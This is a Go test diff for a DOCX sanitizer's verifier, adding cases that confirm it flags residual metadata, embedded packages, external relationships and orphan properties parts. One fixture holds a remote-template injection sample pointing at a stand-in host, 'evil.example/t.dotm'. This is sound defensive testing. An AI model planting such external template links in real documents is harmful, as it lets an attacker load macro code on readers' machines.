@@ -9,6 +9,8 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"sort"
+	"strings"
 	"testing"
 )
 
@@ -417,4 +419,150 @@ func TestVerifierDoesNotScanPDFStreamPayloads(t *testing.T) {
 			"disabled the check instead of narrowing it")
 	}
 	_ = withMarkers
+}
+
+// TestVerifierCatchesRelationshipResidue is the regression proof for the
+// fifteenth finding of PR #12, and the third time in one review that the
+// remover moved and the checker did not.
+//
+// The verifier reported embedded_file, external_reference AND
+// document_metadata as confirmed absent while checking only part MIME types,
+// the OLE signature and the macroEnabled content type. An archive still
+// carrying metadata/core.xml plus a core-properties relationship passed it --
+// so the one thing an independent verifier exists to catch, a sanitizer-side
+// miss, was exactly what it could not see.
+//
+// Each case is a package the SANITIZER would have cleaned. They are handed
+// straight to the verifier, which is the only way to ask "would you have
+// noticed".
+func TestVerifierCatchesRelationshipResidue(t *testing.T) {
+	requireVerifierBinaries(t)
+
+	rels := func(inner string) []byte {
+		return []byte(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` +
+			`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
+			inner + `</Relationships>`)
+	}
+
+	cases := []struct {
+		name  string
+		parts map[string][]byte
+		want  string
+	}{
+		{
+			// The target's ROOT ELEMENT is deliberately not a properties
+			// root, so the content check cannot fire and only the
+			// relationship traversal can. Otherwise this case would pass
+			// while that traversal was broken.
+			name: "core-properties relationship outside docProps",
+			parts: map[string][]byte{
+				"_rels/.rels":       rels(`<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="metadata/core.xml"/>`),
+				"metadata/core.xml": []byte(`<?xml version="1.0"?><notAPropertiesRoot><creator>SecretAuthor</creator></notAPropertiesRoot>`),
+			},
+			want: "core-properties",
+		},
+		{
+			name: "embedded package relationship",
+			parts: map[string][]byte{
+				"word/_rels/document.xml.rels": rels(`<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/package" Target="media/attached.docx"/>`),
+				"word/media/attached.docx":     []byte("PK\x03\x04attached"),
+			},
+			want: "package",
+		},
+		{
+			name: "external relationship",
+			parts: map[string][]byte{
+				"word/_rels/settings.xml.rels": rels(`<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/>`),
+			},
+			want: "external relationship",
+		},
+		{
+			name: "properties part with no relationship pointing at it",
+			parts: map[string][]byte{
+				"stray/props.xml": []byte(`<?xml version="1.0"?><Properties><Company>SecretCompany</Company></Properties>`),
+			},
+			want: "document-properties part",
+		},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			path := filepath.Join(t.TempDir(), "out.docx")
+			var buf bytes.Buffer
+			zw := zip.NewWriter(&buf)
+			all := map[string][]byte{
+				"[Content_Types].xml": []byte(`<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>`),
+				"word/document.xml":   []byte(`<?xml version="1.0"?><document/>`),
+			}
+			for k, v := range tc.parts {
+				all[k] = v
+			}
+			// Sorted, not map order. Two of this verifier's checks can each
+			// catch some of these cases, and unzip lists parts in archive
+			// order -- so with map iteration WHICH check fired varied per
+			// run, and an assertion on the message was passing by luck. A
+			// test whose outcome depends on map ordering is not testing what
+			// it says it tests.
+			names := make([]string, 0, len(all))
+			for name := range all {
+				names = append(names, name)
+			}
+			sort.Strings(names)
+			for _, name := range names {
+				w, err := zw.Create(name)
+				if err != nil {
+					t.Fatal(err)
+				}
+				if _, err := w.Write(all[name]); err != nil {
+					t.Fatal(err)
+				}
+			}
+			if err := zw.Close(); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(path, buf.Bytes(), 0o600); err != nil {
+				t.Fatal(err)
+			}
+
+			_, err := VerifySanitized(context.Background(), "docx", path)
+			if err == nil {
+				t.Fatalf("the verifier confirmed this package clean; it reports the OOXML " +
+					"classes as verified while being unable to see this residue at all")
+			}
+			if !errors.Is(err, ErrSanitizeResidue) {
+				t.Fatalf("want residue, got %v", err)
+			}
+			if !strings.Contains(err.Error(), tc.want) {
+				t.Errorf("failure does not name what it found (%q): %v", tc.want, err)
+			}
+		})
+	}
+}
+
+// TestVerifierAndSanitizerAgreeOnRelationshipTypes holds the two deliberately
+// separate tables equal.
+//
+// They are separate so a mistake in the sanitizer's handling cannot travel
+// into its own verification. That is only worth anything if a DIVERGENCE is
+// loud: a type the sanitizer drops and the verifier does not know about is a
+// class the report would claim verified without checking.
+func TestVerifierAndSanitizerAgreeOnRelationshipTypes(t *testing.T) {
+	for leaf := range embeddedContentRelTypes {
+		if _, ok := verifyResidualRelTypes[leaf]; !ok {
+			t.Errorf("the sanitizer drops %q but the verifier does not look for it", leaf)
+		}
+	}
+	for leaf := range metadataRelTypes {
+		if _, ok := verifyResidualRelTypes[leaf]; !ok {
+			t.Errorf("the sanitizer drops %q but the verifier does not look for it", leaf)
+		}
+	}
+	for leaf := range verifyResidualRelTypes {
+		_, embedded := embeddedContentRelTypes[leaf]
+		_, metadata := metadataRelTypes[leaf]
+		if !embedded && !metadata {
+			t.Errorf("the verifier rejects %q but the sanitizer never drops it -- every "+
+				"sanitized package would fail verification", leaf)
+		}
+	}
 }
